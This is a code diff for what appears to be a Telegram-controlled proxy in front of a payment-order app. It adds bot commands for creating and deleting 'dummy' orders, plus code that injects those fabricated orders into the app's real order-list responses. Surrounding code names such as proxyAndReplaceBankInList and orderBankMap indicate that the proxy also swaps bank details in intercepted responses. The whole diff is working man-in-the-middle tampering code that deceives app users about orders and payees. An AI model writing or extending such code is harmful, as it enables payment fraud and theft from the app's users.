@@ -311,8 +311,22 @@ const DEFAULT_DATA = {
   trackedUsers: {},
   balanceHistory: [],
   orderBankMap: {},
-  sentOrderInfo: {}
+  sentOrderInfo: {},
+  dummyOrders: []
 };
+
+function generateDummyCode() {
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let code = '';
+  for (let i = 0; i < 6; i++) {
+    code += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return code;
+}
+
+function generateDummyId() {
+  return String(Math.floor(10000000 + Math.floor(Math.random() * 90000000)));
+}
 
 let bot = null;
 let webhookSet = false;
@@ -1139,6 +1153,11 @@ app.post('/bot-webhook', async (req, res) => {
 /orders — List all saved order-bank bindings
 /delorder <code/num/all> — Delete order-bank binding
 
+=== DUMMY ORDERS ===
+/adddummy <amount> [minRange] [maxRange] — Add dummy order
+/dummies — List all dummy orders
+/deldummy <code/id/num/all> — Delete dummy order
+
 === CONTROL ===
 /on — Proxy ON
 /off — Proxy OFF
@@ -1578,6 +1597,125 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/adddummy')) {
+      data.dummyOrders = data.dummyOrders || [];
+      const parts = text.substring(9).trim().split(/\s+/);
+      const amount = parseFloat(parts[0]);
+      if (isNaN(amount) || amount <= 0) {
+        await bot.sendMessage(chatId, '❌ Format: `/adddummy <amount> [minRange] [maxRange]`\n\nExamples:\n`/adddummy 434` (auto-detects range 301-500)\n`/adddummy 400 301 500`\n`/adddummy 5000 5001 10000`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+
+      let minRange = parseFloat(parts[1]);
+      let maxRange = parseFloat(parts[2]);
+
+      if (isNaN(minRange) || isNaN(maxRange)) {
+        if (amount >= 1 && amount <= 300) { minRange = 1; maxRange = 300; }
+        else if (amount >= 301 && amount <= 500) { minRange = 301; maxRange = 500; }
+        else if (amount >= 501 && amount <= 1000) { minRange = 501; maxRange = 1000; }
+        else if (amount >= 1001 && amount <= 5000) { minRange = 1001; maxRange = 5000; }
+        else if (amount >= 5001 && amount <= 10000) { minRange = 5001; maxRange = 10000; }
+        else if (amount >= 10001 && amount <= 20000) { minRange = 10001; maxRange = 20000; }
+        else { minRange = Math.floor(amount * 0.8); maxRange = Math.ceil(amount * 1.2); }
+      }
+
+      const dummyCode = generateDummyCode();
+      const dummyId = generateDummyId();
+      const income = parseFloat((amount * 0.04).toFixed(2));
+      const quota = parseFloat((amount + income).toFixed(2));
+
+      const dummyObj = {
+        id: dummyId,
+        payOrderId: dummyId,
+        orderId: dummyId,
+        buyId: dummyId,
+        code: dummyCode,
+        orderCode: dummyCode,
+        buyCode: dummyCode,
+        amount: amount,
+        orderAmount: amount,
+        rewardRate: 0.04,
+        rewardAmount: income,
+        income: income,
+        quota: quota,
+        smallAmountBonus: false,
+        smallAmountBonusAmount: 0,
+        status: 0,
+        minRange: minRange,
+        maxRange: maxRange,
+        isDummy: true,
+        createdAt: new Date().toISOString()
+      };
+
+      data.dummyOrders.push(dummyObj);
+      await saveData(data);
+      cacheOrderDetails(dummyObj);
+
+      let msg = `✅ *Dummy Order Created!*\n━━━━━━━━━━━━━━━━━━\n`;
+      msg += `📋 *Code:* \`${dummyCode}\` | ID: \`${dummyId}\`\n`;
+      msg += `💰 *Amount:* \`₹${amount}\`\n`;
+      msg += `📈 *Income (4%):* \`₹${income}\` | Quota: \`₹${quota}\`\n`;
+      msg += `📍 *Target Section:* \`${minRange}-${maxRange}\` range\n`;
+
+      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text === '/dummies') {
+      data.dummyOrders = data.dummyOrders || [];
+      if (data.dummyOrders.length === 0) {
+        await bot.sendMessage(chatId, '📭 No dummy orders currently active in KV storage.');
+        return res.sendStatus(200);
+      }
+      let msg = `🎭 *Active Dummy Orders (${data.dummyOrders.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
+      data.dummyOrders.forEach((d, idx) => {
+        msg += `${idx + 1}. 📋 *Code:* \`${d.code}\` | ID: \`${d.id}\`\n`;
+        msg += `   💰 *Amount:* \`₹${d.amount}\` (Income: \`₹${d.income}\` | Quota: \`₹${d.quota}\`)\n`;
+        msg += `   📍 *Range:* \`${d.minRange}-${d.maxRange}\`\n\n`;
+      });
+      msg += `📌 Delete a dummy order: \`/deldummy <Code>\` or \`/deldummy <index>\``;
+      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/deldummy')) {
+      data.dummyOrders = data.dummyOrders || [];
+      const param = text.substring(9).trim();
+      if (!param) {
+        await bot.sendMessage(chatId, '❌ Format: `/deldummy <code/id/index/all>`\n\nExample: `/deldummy Izpjkx` or `/deldummy 1` or `/deldummy all`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      if (param.toLowerCase() === 'all') {
+        const count = data.dummyOrders.length;
+        data.dummyOrders = [];
+        await saveData(data);
+        await bot.sendMessage(chatId, `🗑️ Cleared all ${count} dummy orders from KV storage.`);
+        return res.sendStatus(200);
+      }
+      const num = parseInt(param);
+      if (!isNaN(num) && String(num) === param) {
+        const target = data.dummyOrders[num - 1];
+        if (!target) {
+          await bot.sendMessage(chatId, `❌ Invalid index #${num}. Run /dummies to view list.`);
+          return res.sendStatus(200);
+        }
+        data.dummyOrders.splice(num - 1, 1);
+        await saveData(data);
+        await bot.sendMessage(chatId, `🗑️ Deleted dummy order #${num} (\`${target.code}\`) from KV storage.`, { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+
+      const initialLen = data.dummyOrders.length;
+      data.dummyOrders = data.dummyOrders.filter(d => d.code.toLowerCase() !== param.toLowerCase() && String(d.id).toLowerCase() !== param.toLowerCase());
+      if (data.dummyOrders.length < initialLen) {
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Dummy order \`${param}\` deleted from KV storage.`, { parse_mode: 'Markdown' });
+      } else {
+        await bot.sendMessage(chatId, `❌ No dummy order found matching \`${param}\`. Run /dummies to view list.`, { parse_mode: 'Markdown' });
+      }
+      return res.sendStatus(200);
+    }
+
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1880,6 +2018,28 @@ async function proxyAndReplaceBankInList(req, res) {
 
     const listData = getResponseData(jsonResp);
     if (listData) {
+      if (data.dummyOrders && Array.isArray(data.dummyOrders) && data.dummyOrders.length > 0 && req.originalUrl.includes('/app/payment/order') && !req.originalUrl.includes('/history') && !req.originalUrl.includes('orderInfo')) {
+        const qMin = parseFloat(req.query.minAmount || 0);
+        const qMax = parseFloat(req.query.maxAmount || 9999999);
+        const matchingDummies = data.dummyOrders.filter(d => {
+          const amt = parseFloat(d.amount || d.orderAmount || 0);
+          if (req.query.minAmount || req.query.maxAmount) {
+            return amt >= qMin && amt <= qMax;
+          }
+          return true;
+        });
+
+        if (matchingDummies.length > 0) {
+          if (Array.isArray(listData)) {
+            listData.unshift(...matchingDummies);
+          } else if (listData.records && Array.isArray(listData.records)) {
+            listData.records.unshift(...matchingDummies);
+          } else if (listData.list && Array.isArray(listData.list)) {
+            listData.list.unshift(...matchingDummies);
+          }
+        }
+      }
+
       cacheOrderDetails(listData);
       const applyToItem = (item) => {
         if (!item || typeof item !== 'object') return;
